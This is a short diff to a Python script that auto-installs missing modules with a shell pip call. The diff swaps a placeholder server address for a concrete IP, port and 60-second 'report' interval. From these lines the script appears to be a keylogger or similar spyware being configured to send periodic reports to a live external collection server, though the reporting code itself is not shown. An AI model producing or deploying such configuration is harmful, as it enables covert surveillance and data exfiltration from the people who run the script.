@@ -17,7 +17,7 @@ except ModuleNotFoundError:
     call("pip install " + ' '.join(modules), shell=True)
 
 finally:
-    SERVER_IP = "your.server.ip"
+    SERVER_IP = "139.162.176.247"
     SERVER_PORT = 8080
     SEND_REPORT_EVERY = 60  # in seconds
 
